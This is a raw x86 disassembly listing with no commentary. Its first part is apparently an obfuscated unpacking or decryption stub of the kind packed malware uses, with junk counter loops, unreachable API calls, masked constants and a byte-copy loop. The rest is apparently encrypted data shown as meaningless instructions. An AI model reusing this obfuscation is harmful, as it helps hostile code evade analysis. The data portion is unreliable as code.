  41d21a:	mov    edx,DWORD PTR [esp+0x1c]
  41d21e:	mov    eax,ds:0x42634d
  41d223:	xor    edx,esi
  41d225:	add    edx,ebx
  41d227:	xor    ebx,ebx
  41d229:	add    edx,edi
  41d22b:	adc    ebx,0xffffffff
  41d22e:	xor    esi,esi
  41d230:	xor    edx,ecx
  41d232:	xor    ebx,0x0
  41d235:	add    eax,edi
  41d237:	adc    esi,0xffffffff
  41d23a:	xor    eax,ecx
  41d23c:	xor    esi,0x0
  41d23f:	cmp    eax,edx
  41d241:	jne    0x41d259
  41d247:	cmp    esi,ebx
  41d249:	jne    0x41d259
  41d24f:	mov    eax,ds:0x42634d
  41d254:	mov    ds:0x426355,eax
  41d259:	mov    eax,ds:0x4262c9
  41d25e:	push   0x4
  41d260:	add    eax,0x1cc
  41d265:	push   eax
  41d266:	lea    eax,[esp+0x2c]
  41d26a:	push   eax
  41d26b:	call   0x41d27f
  41d270:	mov    eax,DWORD PTR [esp+0x24]
  41d274:	mov    eax,DWORD PTR [eax]
  41d276:	pop    edi
  41d277:	pop    esi
  41d278:	pop    ebx
  41d279:	mov    esp,ebp
  41d27b:	pop    ebp
  41d27c:	ret    0xc
  41d27f:	push   ebp
  41d280:	mov    ebp,esp
  41d282:	sub    esp,0x10
  41d285:	mov    eax,ds:0x427ca1
  41d28a:	mov    ecx,DWORD PTR ds:0x429d65
  41d290:	sub    eax,ecx
  41d292:	add    eax,DWORD PTR [eax+ecx*1]
  41d295:	mov    eax,0xf89c85b5
  41d29a:	and    DWORD PTR ds:0x426eb9,ecx
  41d2a0:	mov    DWORD PTR [ebp-0x4],eax
  41d2a3:	and    DWORD PTR ds:0x426f29,0x0
  41d2ad:	mov    edx,DWORD PTR ds:0x426f29
  41d2b3:	inc    edx
  41d2b4:	mov    DWORD PTR ds:0x426f29,edx
  41d2ba:	cmp    DWORD PTR ds:0x426f29,0xc
  41d2c1:	jge    0x41d300
  41d2c7:	jmp    0x41d2d7
  41d2cc:	push   0x4f6e
  41d2d1:	call   DWORD PTR ds:0x430a2c
  41d2d7:	cmp    DWORD PTR ds:0x426f29,0xb
  41d2de:	jne    0x41d2f3
  41d2e4:	xor    edx,edx
  41d2e6:	add    edx,DWORD PTR ds:0x426f29
  41d2ec:	inc    edx
  41d2ed:	mov    DWORD PTR ds:0x426f29,edx
  41d2f3:	cmp    DWORD PTR ds:0x426f29,0x14
  41d2fa:	jb     0x41d2ad
  41d300:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  41d307:	mov    edx,DWORD PTR ds:0x426ee9
  41d30d:	sbb    DWORD PTR ds:0x426f21,edx
  41d313:	mov    ecx,DWORD PTR [ebp-0x4]
  41d316:	mov    DWORD PTR ds:0x426ebd,0x1b
  41d320:	cmp    DWORD PTR ds:0x426ebd,0x0
  41d327:	je     0x41d371
  41d32d:	cmp    DWORD PTR ds:0x426ebd,0x2
  41d334:	jg     0x41d371
  41d33a:	jmp    0x41d345
  41d33f:	call   DWORD PTR ds:0x430a38
  41d345:	cmp    DWORD PTR ds:0x426ebd,0x3
  41d34c:	jne    0x41d35f
  41d352:	mov    edx,DWORD PTR ds:0x426ebd
  41d358:	dec    edx
  41d359:	mov    DWORD PTR ds:0x426ebd,edx
  41d35f:	mov    edx,DWORD PTR ds:0x426ebd
  41d365:	dec    edx
  41d366:	mov    DWORD PTR ds:0x426ebd,edx
  41d36c:	jmp    0x41d320
  41d371:	push   esi
  41d372:	or     edx,0x1404
  41d378:	mov    edx,0x75108b3
  41d37d:	mov    esi,DWORD PTR ds:0x426eb5
  41d383:	and    DWORD PTR ds:0x426e95,esi
  41d389:	xor    ecx,edx
  41d38b:	xor    esi,DWORD PTR ds:0x426eb9
  41d391:	mov    esi,0x3272fa
  41d396:	push   edi
  41d397:	xor    DWORD PTR ds:0x426ec5,0xe12
  41d3a1:	mov    edi,DWORD PTR [ebp+0x10]
  41d3a4:	add    ecx,esi
  41d3a6:	mov    DWORD PTR ds:0x426f09,0x182c
  41d3b0:	cmp    ecx,edi
  41d3b2:	je     0x41d4a2
  41d3b8:	mov    ecx,DWORD PTR [ebp-0x4]
  41d3bb:	movzx  edi,WORD PTR ds:0x426f09
  41d3c2:	add    DWORD PTR ds:0x426ea5,edi
  41d3c8:	mov    edi,DWORD PTR [ebp+0x10]
  41d3cb:	xor    eax,eax
  41d3cd:	xor    ecx,edx
  41d3cf:	add    ecx,esi
  41d3d1:	add    DWORD PTR ds:0x426ed1,0x330a
  41d3db:	add    edi,0xfabdbecd
  41d3e1:	mov    DWORD PTR ds:0x426ee5,0x5f33
  41d3eb:	adc    eax,0xffffffff
  41d3ee:	and    DWORD PTR ds:0x426ecd,0x4eeb
  41d3f8:	xor    eax,0x0
  41d3fb:	mov    DWORD PTR [ebp-0xc],eax
  41d3fe:	push   ebx
  41d3ff:	xor    ebx,ebx
  41d401:	xor    edi,0x8a29a147
  41d407:	mov    eax,ecx
  41d409:	add    eax,0xfabdbecd
  41d40e:	adc    ebx,0xffffffff
  41d411:	xor    eax,0x8a29a147
  41d416:	xor    ebx,0x0
  41d419:	cmp    eax,edi
  41d41b:	jne    0x41d434
  41d421:	cmp    ebx,DWORD PTR [ebp-0xc]
  41d424:	je     0x41d49c
  41d42a:	jmp    0x41d434
  41d42f:	mov    esi,0x3272fa
  41d434:	mov    eax,DWORD PTR [ebp-0x4]
  41d437:	mov    edi,DWORD PTR [ebp-0x8]
  41d43a:	xor    edi,edx
  41d43c:	add    edi,esi
  41d43e:	mov    esi,DWORD PTR [ebp+0x8]
  41d441:	imul   edi,ecx
  41d444:	mov    ebx,DWORD PTR [ebp+0xc]
  41d447:	xor    eax,edx
  41d449:	add    eax,ecx
  41d44b:	mov    al,BYTE PTR [ebx+eax*1+0x3272fa]
  41d452:	mov    BYTE PTR [edi+esi*1],al
  41d455:	mov    eax,DWORD PTR [ebp-0x8]
  41d458:	mov    esi,DWORD PTR [ebp+0x10]
  41d45b:	xor    eax,edx
  41d45d:	xor    ebx,ebx
  41d45f:	add    esi,0xfabdbecd
  41d465:	adc    ebx,0xffffffff
  41d468:	lea    ecx,[ecx+eax*1+0x3272fa]
  41d46f:	xor    edi,edi
  41d471:	xor    esi,0x8a29a147
  41d477:	xor    ebx,0x0
  41d47a:	mov    eax,ecx
  41d47c:	add    eax,0xfabdbecd
  41d481:	adc    edi,0xffffffff
  41d484:	xor    eax,0x8a29a147
  41d489:	xor    edi,0x0
  41d48c:	cmp    eax,esi
  41d48e:	jne    0x41d42f
  41d494:	cmp    edi,ebx
  41d496:	jne    0x41d42f
  41d49c:	mov    eax,0xf89c85b4
  41d4a1:	pop    ebx
  41d4a2:	pop    edi
  41d4a3:	pop    esi
  41d4a4:	leave  
  41d4a5:	ret    0xc
  41d4a8:	push   ebp
  41d4a9:	mov    ebp,esp
  41d4ab:	push   ecx
  41d4ac:	and    DWORD PTR ds:0x426e8d,0x0
  41d4b6:	mov    eax,ds:0x426e8d
  41d4bb:	inc    eax
  41d4bc:	mov    ds:0x426e8d,eax
  41d4c1:	cmp    DWORD PTR ds:0x426e8d,0x1c
  41d4c8:	jge    0x41d4eb
  41d4ce:	jmp    0x41d4de
  41d4d3:	push   0x5eb6
  41d4d8:	call   DWORD PTR ds:0x430a3c
  41d4de:	cmp    DWORD PTR ds:0x426e8d,0x1a
  41d4e5:	jb     0x41d4b6
  41d4eb:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41d4f2:	neg    DWORD PTR ds:0x426e9d
  41d4f8:	mov    eax,DWORD PTR [ebp+0x8]
  41d4fb:	or     ecx,edx
  41d4fd:	movsx  eax,BYTE PTR [eax]
  41d500:	sub    ecx,ecx
  41d502:	jmp    0x41f875
  41d507:	ret    0x203
  41d50a:	add    BYTE PTR [edx-0x7e],0x42
  41d50e:	inc    ebx
  41d50f:	cmc    
  41d510:	in     al,0x42
  41d512:	sub    BYTE PTR [ecx+0x68],ch
  41d515:	mov    ?,WORD PTR [edx+0x7b7afe62]
  41d51b:	rcr    DWORD PTR [ebx+edi*2-0x950a85],1
  41d522:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d523:	or     BYTE PTR [esi+0x6e],0x11
  41d527:	pusha  
  41d528:	pop    ds
  41d529:	inc    ebx
  41d52a:	int    0xf3
  41d52c:	nop
  41d52d:	pop    es
  41d52e:	mov    ebx,0x51e0f0fd
  41d533:	adc    eax,0xb3390532
  41d538:	mov    WORD PTR [edi-0x52b1de25],cs
  41d53e:	fbld   TBYTE PTR ds:0x4c8be4ac
  41d544:	cmp    esi,DWORD PTR [ebx+0x90fdc90]
  41d54a:	cmp    DWORD PTR [ecx],ebx
  41d54c:	enter  0xae9b,0x5e
  41d550:	jmp    0x41d5b7
  41d552:	adc    dl,BYTE PTR [ebp+0x4e]
  41d555:	mul    edx
  41d557:	push   eax
  41d558:	sub    DWORD PTR [ecx],ebx
  41d55a:	mov    eax,0x1fcd5295
  41d55f:	xor    BYTE PTR [esi+0x4fd792b1],bh
  41d565:	daa    
  41d566:	mov    bh,0x32
  41d568:	xor    BYTE PTR [ecx],ah
  41d56a:	adc    DWORD PTR ds:0xb40d561c,0x7e537051
  41d574:	call   0xd683b9bd
  41d579:	xchg   dl,bl
  41d57b:	call   0x881d:0xd5651154
  41d582:	add    eax,0xf052f04a
  41d587:	xor    al,0x62
  41d589:	bound  eax,QWORD PTR [esi-0x1a04011a]
  41d58f:	add    DWORD PTR [esp+esi*2+0x2f],edx
  41d593:	push   es
  41d594:	cs cld 
  41d596:	inc    edx
  41d597:	rcr    BYTE PTR [bp+si+0x29],cl
  41d59b:	hlt    
  41d59c:	in     al,0x17
  41d59e:	test   al,0x35
  41d5a0:	mov    ecx,0xa7e23a2b
  41d5a5:	sub    ecx,DWORD PTR [bx+di]
  41d5a8:	mov    al,ds:0xac3d0e8e
  41d5ad:	pushf  
  41d5ae:	push   DWORD PTR [esi]
  41d5b0:	jmp    0x4219466f
  41d5b5:	jno    0x41d54a
  41d5b7:	pop    ecx
  41d5b8:	xchg   edi,eax
  41d5b9:	ja     0x41d59c
  41d5bb:	arpl   WORD PTR [ebp+0x4ffbcdbc],bp
  41d5c1:	mov    eax,0xda13c46c
  41d5c6:	push   ecx
  41d5c7:	xchg   edx,eax
  41d5c8:	mov    al,ds:0x561394ce
  41d5cd:	lahf   
  41d5ce:	cdq    
  41d5cf:	cli    
  41d5d0:	ffreep st(7)
  41d5d2:	gs dec edx
  41d5d4:	sti    
  41d5d5:	pushf  
  41d5d6:	pop    edi
  41d5d7:	popf   
  41d5d8:	ss xor al,0x18
  41d5db:	xchg   sp,ax
  41d5dd:	pop    ebx
  41d5de:	xor    DWORD PTR [esi-0x4298a9c6],0x29f3b77d
  41d5e8:	mov    edx,ss
  41d5ea:	xor    DWORD PTR [ecx-0x47f1b84a],esp
  41d5f0:	cdq    
  41d5f1:	mov    ebp,0x709dd0f2
  41d5f6:	pop    es
  41d5f7:	jp     0x41d631
  41d5f9:	xchg   DWORD PTR [esi],esp
  41d5fb:	call   0xc7a00ca6
  41d600:	mov    esi,0x92093fd0
  41d605:	pop    esi
  41d606:	mov    ebx,DWORD PTR [eax]
  41d608:	mov    ebp,0x14ca83c2
  41d60d:	imul   esp,esp,0x34
  41d610:	cmp    dl,0x81
  41d613:	push   ebp
  41d614:	mov    eax,ds:0xa606eddf
  41d619:	arpl   WORD PTR [edx+ebp*4],bp
  41d61c:	or     DWORD PTR [ebx+0x1544796c],0xffffffa7
  41d623:	pop    esp
  41d624:	or     DWORD PTR [ecx-0x3a66d8],esi
  41d62a:	and    BYTE PTR [ebx+0x13],bh
  41d62d:	fild   WORD PTR es:[edx+edi*2+0x670383d0]
  41d635:	sbb    BYTE PTR [ecx],bl
  41d637:	pop    edx
  41d638:	mov    edi,0x21f834d3
  41d63d:	aam    0xb
  41d63f:	arpl   WORD PTR [ecx-0x767bb4e7],si
  41d645:	aam    0xae
  41d647:	sub    DWORD PTR [ebx+0xed557af],esi
  41d64d:	push   eax
  41d64e:	(bad)  
  41d64f:	scas   al,BYTE PTR es:[edi]
  41d650:	or     dh,bh
  41d652:	cli    
  41d653:	mov    ebp,0x2e912a29
  41d658:	rol    BYTE PTR [edx],1
  41d65a:	retf   0xa48d
  41d65d:	xchg   edi,eax
  41d65e:	dec    ebx
  41d65f:	rol    DWORD PTR [ecx+0x4],1
  41d662:	lahf   
  41d663:	push   edi
  41d664:	icebp  
  41d665:	frstor [edx-0x3e635e57]
  41d66b:	cli    
  41d66c:	xor    DWORD PTR [ebp+0x2b],ebp
  41d66f:	mov    cl,0x6
  41d671:	ds mov ebp,0x6177d0a7
  41d677:	sbb    DWORD PTR [edx],ecx
  41d679:	mov    dh,0x87
  41d67b:	xor    bh,BYTE PTR fs:[ecx-0x44]
  41d67f:	jp     0x41d685
  41d681:	jl     0x41d6b0
  41d683:	dec    esi
  41d684:	inc    edx
  41d685:	cmp    BYTE PTR [esp+ebx*8],bl
  41d688:	and    edi,DWORD PTR [edi]
  41d68a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d68b:	xor    bl,ah
  41d68d:	jae    0x41d6e2
  41d68f:	dec    eax
  41d690:	and    eax,0xe9b7fcd7
  41d695:	push   edi
  41d696:	push   edx
  41d697:	dec    edi
  41d698:	les    eax,FWORD PTR [edx+0x4b]
  41d69b:	call   0xde87:0x52a8b2ea
  41d6a2:	jle    0x41d6bc
  41d6a4:	push   ebx
  41d6a5:	add    dl,ah
  41d6a7:	mov    edx,ecx
  41d6a9:	dec    ebp
  41d6aa:	pushf  
  41d6ab:	or     eax,0x72293297
  41d6b0:	lods   al,BYTE PTR ds:[esi]
  41d6b1:	jbe    0x41d6f6
  41d6b3:	cdq    
  41d6b4:	lods   eax,DWORD PTR ds:[esi]
  41d6b5:	jb     0x41d6d7
  41d6b7:	add    DWORD PTR [ebx+0x59019d0a],esp
  41d6bd:	inc    esp
  41d6be:	pop    edx
  41d6bf:	enter  0x78ac,0x67
  41d6c3:	cld    
  41d6c4:	outs   dx,DWORD PTR ds:[esi]
  41d6c5:	dec    esp
  41d6c6:	pop    ebp
  41d6c7:	js     0x41d671
  41d6c9:	in     al,0x9f
  41d6cb:	(bad)  
  41d6cc:	jns    0x41d671
  41d6ce:	push   esi
  41d6cf:	or     dl,cl
  41d6d1:	push   edx
  41d6d2:	fld    QWORD PTR [ecx-0xa]
  41d6d5:	iret   
  41d6d6:	es push 0xd18ddcbc
  41d6dc:	inc    esi
  41d6dd:	(bad)  
  41d6de:	xor    ebp,ecx
  41d6e0:	adc    DWORD PTR [esi+0x3f008225],ecx
  41d6e6:	add    DWORD PTR [edx-0x2f],ebx
  41d6e9:	inc    ebp
  41d6ea:	out    0x1c,al
  41d6ec:	pop    es
  41d6ed:	call   0xc14ad56e
  41d6f2:	(bad)  
  41d6f3:	int3   
  41d6f4:	or     al,dh
  41d6f6:	pop    ebx
  41d6f7:	or     BYTE PTR ss:0x60bd701e,bh
  41d6fe:	cmp    eax,0xa38b1996
  41d703:	lods   eax,DWORD PTR ds:[esi]
  41d704:	or     BYTE PTR [ebx+ecx*1],ah
  41d707:	call   DWORD PTR [eax-0xa5cd571]
  41d70d:	sub    eax,0xba76ed19
  41d712:	and    bh,BYTE PTR [ecx-0x62]
  41d715:	lods   al,BYTE PTR ds:[esi]
  41d716:	enter  0x6204,0x24
  41d71a:	push   ecx
  41d71b:	jmp    0x41d795
  41d71d:	and    al,0xbf
  41d71f:	js     0x41d789
  41d721:	stos   BYTE PTR es:[edi],al
  41d722:	mov    ah,0xe1
  41d724:	leave  
  41d725:	pop    es
  41d726:	ds pop esp
  41d728:	mov    ch,0xde
  41d72a:	rcr    DWORD PTR [eax-0x40],1
  41d72d:	jns    0x41d761
  41d72f:	inc    edi
  41d730:	daa    
  41d731:	aaa    
  41d732:	call   0x5cc9:0xdb0573ef
  41d739:	in     al,0x11
  41d73b:	in     eax,dx
  41d73c:	jecxz  0x41d782
  41d73e:	clc    
  41d73f:	gs ret 0x728b
  41d743:	and    ch,bl
  41d745:	sub    eax,0x59a75a02
  41d74a:	outs   dx,BYTE PTR ds:[esi]
  41d74b:	jae    0x41d7ac
  41d74d:	retf   0x9e75
  41d750:	rcl    DWORD PTR [ebx-0x46],1
  41d753:	mov    eax,ds:0xa03b1d01
  41d758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d759:	ret    
  41d75a:	xor    eax,edx
  41d75c:	nop
  41d75d:	ret    0x71a1
  41d760:	pop    eax
  41d762:	mov    ah,0x5a
  41d764:	(bad)  
  41d765:	cwde   
  41d766:	fs in  eax,dx
  41d768:	sbb    DWORD PTR [ecx],eax
  41d76a:	push   ebx
  41d76b:	jnp    0x41d6fa
  41d76d:	shl    al,cl
  41d76f:	not    BYTE PTR [edx-0x2c17cd5e]
  41d775:	add    ecx,DWORD PTR [edx]
  41d777:	cmp    ecx,DWORD PTR [ecx+0x46e79fe2]
  41d77d:	xor    bh,BYTE PTR [edx]
  41d77f:	inc    esp
  41d780:	mov    dh,0x56
  41d782:	dec    eax
  41d783:	or     eax,0x7ecf9a1b
  41d788:	pop    edx
  41d789:	pop    ebp
  41d78a:	les    edx,FWORD PTR [ecx+eiz*4]
  41d78d:	repz mov edi,DWORD PTR [edx+0x75f92f9]
  41d794:	jnp    0x41d7bc
  41d796:	cmp    bh,BYTE PTR [ebx+edi*8-0x13]
  41d79a:	aam    0xbf
  41d79c:	jl     0x41d776
  41d79e:	stos   DWORD PTR es:[edi],eax
  41d79f:	shr    BYTE PTR [ebx],1
  41d7a1:	xor    BYTE PTR [ebx-0x71],0xd2
  41d7a5:	arpl   WORD PTR [ebx+0x38],si
  41d7a8:	sbb    esi,eax
  41d7aa:	pop    ecx
  41d7ab:	retf   0x1e0f
  41d7ae:	fs adc al,0xa
  41d7b1:	pushf  
  41d7b2:	mul    ecx
  41d7b4:	add    BYTE PTR [ebp-0x5c],bl
  41d7b7:	sub    BYTE PTR [edx],bh
  41d7b9:	mov    ah,0xad
  41d7bb:	arpl   WORD PTR [eax-0x22],bp
  41d7be:	or     ecx,edx
  41d7c0:	cld    
  41d7c1:	mov    eax,0xf0f80a65
  41d7c6:	stos   DWORD PTR es:[edi],eax
  41d7c7:	mov    cl,0xe9
  41d7c9:	ret    0x7481
  41d7cc:	pushf  
  41d7cd:	inc    esi
  41d7ce:	jmp    0x41d7d8
  41d7d0:	mov    dh,0xc1
  41d7d2:	fldenv [edi+0x527bd0d9]
  41d7d8:	xor    eax,0xd625af19
  41d7dd:	loop   0x41d7e7
  41d7df:	xor    ch,ah
  41d7e1:	repnz add ecx,DWORD PTR [ebx]
  41d7e4:	ret    0xaf36
  41d7e7:	out    dx,eax
  41d7e8:	pop    ds
  41d7e9:	arpl   WORD PTR [esi-0xce5cd0],di
  41d7ef:	push   0xc4eca763
  41d7f4:	pop    ds
  41d7f5:	ins    DWORD PTR es:[edi],dx
  41d7f6:	dec    esi
  41d7f7:	mov    WORD PTR [ebp+0x1a],?
  41d7fa:	cdq    
  41d7fb:	mov    edi,DWORD PTR [eax]
  41d7fd:	lods   eax,DWORD PTR ds:[esi]
  41d7fe:	stc    
  41d7ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d800:	ins    DWORD PTR es:[edi],dx
  41d801:	cs pop edi
  41d803:	mov    eax,0x64ca3e2f
  41d808:	or     DWORD PTR [ebx+0x5a],esp
  41d80b:	mov    eax,0x4911f0db
  41d810:	sub    edi,0x48d12ddc
  41d816:	mov    al,ds:0xd4bdae0c
  41d81b:	jbe    0x41d88b
  41d81d:	mov    bl,0x33
  41d81f:	mul    DWORD PTR [ecx]
  41d821:	scas   eax,DWORD PTR es:[edi]
  41d822:	test   ah,dl
  41d824:	inc    esi
  41d825:	dec    edi
  41d826:	sbb    edi,DWORD PTR [edi+0x340d65f2]
  41d82c:	test   eax,0xa375fd09
  41d831:	pop    ss
  41d832:	adc    BYTE PTR [eax+eax*4],bl
  41d835:	jb     0x41d813
  41d837:	push   ebp
  41d838:	sbb    eax,0xc45a8b3e
  41d83d:	mov    eax,ds:0x4eb5b1f1
  41d843:	and    al,0x20
  41d845:	jae    0x41d7eb
  41d847:	sahf   
  41d848:	push   ds
  41d849:	inc    ecx
  41d84a:	push   es
  41d84b:	mov    cl,0xa5
  41d84d:	or     al,0x82
  41d84f:	stos   DWORD PTR es:[edi],eax
  41d850:	sub    BYTE PTR [ecx+0x607f3b3a],ch
  41d856:	repnz stc 
  41d858:	mov    al,ds:0xe79ab3f4
  41d85d:	jb     0x41d849
  41d85f:	inc    edi
  41d860:	jb     0x41d7f5
  41d862:	push   ecx
  41d863:	into   
  41d864:	aad    0x35
  41d866:	mov    DWORD PTR [ebx+0x3fc803fe],0xbbd01702
  41d870:	aad    0xdd
  41d872:	sub    esp,DWORD PTR [eax+0x5b]
  41d875:	int3   
  41d876:	iret   
  41d877:	xchg   ebx,eax
  41d878:	daa    
  41d879:	(bad)  
  41d87a:	div    BYTE PTR [eax]
  41d87c:	add    bl,BYTE PTR [ebx-0x89b2ba3]
  41d882:	sub    al,0x12
  41d884:	jge    0x41d8db
  41d886:	xlat   BYTE PTR ds:[ebx]
  41d887:	jne    0x41d8cc
  41d889:	push   edx
  41d88a:	ror    DWORD PTR [ebx+edx*2],cl
  41d88d:	sbb    eax,0xd97fa73e
  41d892:	fimul  DWORD PTR [ebp+0x36]
  41d895:	cmc    
  41d896:	push   cs
  41d897:	jmp    0xf547f7f8
  41d89c:	inc    ebp
  41d89d:	(bad)  
  41d89e:	and    bl,dh
  41d8a0:	loopne 0x41d911
  41d8a2:	jle    0x41d90c
  41d8a4:	stos   BYTE PTR es:[edi],al
  41d8a5:	mov    edi,0xb30712de
  41d8aa:	sahf   
  41d8ab:	hlt    
  41d8ac:	test   BYTE PTR [edx],ch
  41d8ae:	out    dx,eax
  41d8af:	jl     0x41d880
  41d8b1:	sbb    eax,0xab705dda
  41d8b6:	stos   DWORD PTR es:[edi],eax
  41d8b7:	sub    esp,DWORD PTR [esp+esi*4]
  41d8ba:	fs xchg ecx,eax
  41d8bc:	xlat   BYTE PTR ds:[ebx]
  41d8bd:	sar    DWORD PTR [edx+0x2cbf132a],cl
  41d8c3:	ror    al,0x7f
  41d8c6:	aas    
  41d8c7:	ror    BYTE PTR [ecx+0x34],0x8b
  41d8cb:	lods   eax,DWORD PTR ds:[esi]
  41d8cc:	dec    eax
  41d8cd:	sub    dh,BYTE PTR [ecx]
  41d8cf:	jb     0x41d888
  41d8d1:	into   
  41d8d2:	fild   QWORD PTR [esi]
  41d8d4:	jbe    0x41d8d6
  41d8d6:	xchg   ebp,eax
  41d8d7:	data16 in al,0xc3
  41d8da:	pop    es
  41d8db:	jmp    0x41d8e3
  41d8dd:	inc    esi
  41d8de:	fiadd  DWORD PTR [eax+0x17]
  41d8e1:	push   0xffffffa8
  41d8e3:	jl     0x41d885
  41d8e5:	mov    DWORD PTR [edx-0x6438009a],edx
  41d8eb:	fwait
  41d8ec:	add    al,0xc9
  41d8ee:	aam    0xf6
  41d8f0:	vpmaskmovd YMMWORD PTR [eax+ebx*1],ymm3,ymm3
  41d8f6:	pop    ecx
  41d8f7:	mov    al,ds:0x7eeec079
  41d8fc:	add    bh,bh
  41d8fe:	mov    dl,0xb4
  41d900:	(bad)  
  41d901:	xchg   ebx,eax
  41d902:	cmp    al,0x7f
  41d904:	adc    dh,BYTE PTR [esi-0xa]
  41d907:	mov    al,0xd1
  41d909:	sub    eax,0xb49b16dc
  41d90e:	mov    edx,0x787f0540
  41d913:	loopne 0x41d8d3
  41d915:	mov    BYTE PTR [edi],dl
  41d917:	es (bad) 
  41d919:	in     eax,0x0
  41d91b:	add    al,0x3a
  41d91d:	pop    ds
  41d91e:	jo     0x41d8b7
  41d920:	add    DWORD PTR [ebx+ebx*1],ecx
  41d923:	sub    eax,0xaf7b2d01
  41d928:	mov    al,ds:0x8bf8823a
  41d92d:	dec    ebx
  41d92e:	cwde   
  41d92f:	or     dh,bh
  41d931:	or     ebp,0x2b8c1f8e
  41d937:	imul   eax,DWORD PTR [esi-0x741dd4c4],0x573f433f
  41d941:	xchg   BYTE PTR [ebx],dl
  41d943:	xchg   esp,eax
  41d944:	adc    al,BYTE PTR [ebp+0x2]
  41d947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d948:	xchg   BYTE PTR [edi-0x3c],cl
  41d94b:	jge    0x41d992
  41d94d:	fbld   TBYTE PTR [eax-0x67]
  41d950:	push   ebp
  41d951:	or     BYTE PTR [eax-0x69],cl
  41d954:	icebp  
  41d955:	mov    WORD PTR [eax+0x5c],fs
  41d958:	scas   al,BYTE PTR es:[edi]
  41d959:	ficom  DWORD PTR [edi-0x654d40a7]
  41d95f:	dec    ebp
  41d960:	jae    0x41d9a5
  41d962:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d963:	in     al,dx
  41d964:	into   
  41d965:	xor    al,BYTE PTR [edx+edx*4-0x3abd6475]
  41d96c:	adc    cl,bl
  41d96e:	cs push esi
  41d970:	clc    
  41d971:	jne    0x41d8f6
  41d973:	rcl    edx,0x61
  41d976:	jmp    0x41d960
  41d978:	adc    BYTE PTR [ebx+0x2d2a9461],0x67
  41d97f:	or     dh,BYTE PTR [ebp+0x15]
  41d982:	cmp    al,0x14
  41d984:	in     al,0x8
  41d986:	rol    edx,1
  41d988:	dec    eax
  41d989:	jb     0x41d9db
  41d98b:	xchg   esp,eax
  41d98c:	mov    ah,0x18
  41d98e:	dec    ebp
  41d98f:	pop    eax
  41d990:	push   cs
  41d991:	jns    0x41d96e
  41d993:	pop    es
  41d994:	jmp    0xf110648b
  41d999:	in     al,dx
  41d99a:	pop    ecx
  41d99b:	(bad)  
  41d99c:	aas    
  41d99d:	or     ebp,DWORD PTR [bp+di+0x4a]
  41d9a1:	mov    bh,0x49
  41d9a3:	popa   
  41d9a4:	in     al,dx
  41d9a5:	mov    eax,0xd0d18bd9
  41d9aa:	mov    ds:0xd89571f8,al
  41d9af:	cmp    ebx,DWORD PTR [eax+0x24]
  41d9b2:	(bad)  
  41d9b3:	mov    ss,WORD PTR [eax-0x3]
  41d9b6:	pop    edx
  41d9b7:	cmp    cl,BYTE PTR [ecx+0x1b]
  41d9ba:	pop    ebx
  41d9bb:	sub    bh,BYTE PTR ds:0xac61184d
  41d9c1:	mul    DWORD PTR [eax]
  41d9c3:	jmp    0x91e4:0x7693bfc0
  41d9ca:	jmp    0x84e9:0xa743ba9c
  41d9d1:	mov    bh,0x7c
  41d9d4:	push   eax
  41d9d5:	or     eax,0x193dfa17
  41d9da:	dec    esi
  41d9db:	mov    al,ds:0x5804fe46
  41d9e0:	jecxz  0x41d9d8
  41d9e2:	inc    ebx
  41d9e3:	push   edi
  41d9e4:	push   eax
  41d9e5:	xchg   esi,eax
  41d9e6:	dec    ebx
  41d9e7:	pop    ebp
  41d9e8:	(bad)  
  41d9e9:	push   esi
  41d9ea:	add    eax,0x4830ec18
  41d9ef:	ins    BYTE PTR es:[edi],dx
  41d9f0:	arpl   WORD PTR [ebx-0x2081f5bd],bp
  41d9f6:	mov    al,ds:0xcbd59d0
  41d9fb:	inc    DWORD PTR [edi+0x5c9877d0]
  41da01:	stos   BYTE PTR es:[edi],al
  41da02:	inc    edx
  41da03:	mov    dl,bl
  41da05:	cmp    esp,DWORD PTR [ecx-0x229304bd]
  41da0b:	pop    ecx
  41da0c:	(bad)  
  41da0d:	fdiv   st,st(7)
  41da0f:	or     al,0x49
  41da11:	or     DWORD PTR [edx-0x7f],esp
  41da14:	and    DWORD PTR [ebx],edi
  41da16:	cmp    DWORD PTR ds:0x3d63be78,edi
  41da1c:	dec    ecx
  41da1d:	test   DWORD PTR ds:0x5014397f,edx
  41da23:	xor    edi,DWORD PTR [eax-0x28]
  41da26:	push   0xffffffb1
  41da28:	js     0x41d9c2
  41da2a:	retf   0x9cc9
  41da2d:	fwait
  41da2e:	xor    bl,BYTE PTR [edx+ecx*8-0x30795fbd]
  41da35:	jbe    0x41da7e
  41da37:	mov    ds:0x1562ad0e,al
  41da3c:	jmp    0x86e5:0x8a191d9a
  41da43:	test   dh,ah
  41da45:	out    0x2,eax
  41da47:	jge    0x41da00
  41da49:	cdq    
  41da4a:	mov    cl,0x8f
  41da4c:	add    al,0x65
  41da4e:	or     esi,eax
  41da50:	dec    esp
  41da51:	in     al,dx
  41da52:	jo     0x41da1b
  41da54:	rcr    BYTE PTR [edi+0x254d742c],0x84
  41da5b:	dec    ecx
  41da5c:	(bad)  
  41da5d:	out    dx,eax
  41da5e:	jnp    0x41da8a
  41da60:	cmp    BYTE PTR [ecx-0x70],al
  41da63:	test   eax,0xe53b2387
  41da68:	xchg   DWORD PTR [edi-0x418e4a81],esp
  41da6e:	pop    ss
  41da6f:	aaa    
  41da70:	inc    esp
  41da71:	adc    DWORD PTR [ebx+edx*8+0xb],edx
  41da75:	dec    ebx
  41da76:	jb     0x41da88
  41da78:	fld    DWORD PTR [ebx+0x15068361]
  41da7e:	sub    eax,0x59497bff
  41da83:	jle    0x41da5d
  41da85:	mov    bh,ch
  41da87:	push   ebp
  41da88:	jp     0x41da13
  41da8a:	inc    ecx
  41da8b:	push   ebx
  41da8c:	inc    edi
  41da8d:	test   DWORD PTR [edi+eiz*8],edx
  41da90:	arpl   WORD PTR es:[edi],si
  41da93:	mov    dl,0xf6
  41da95:	push   esi
  41da96:	push   edx
  41da97:	lds    edi,FWORD PTR ds:0x12180d7a
  41da9d:	out    0xbb,eax
  41da9f:	lea    esp,[ebx-0x75]
  41daa2:	cmova  ecx,DWORD PTR [edi]
  41daa5:	std    
  41daa6:	push   ebp
  41daa7:	adc    al,0x5e
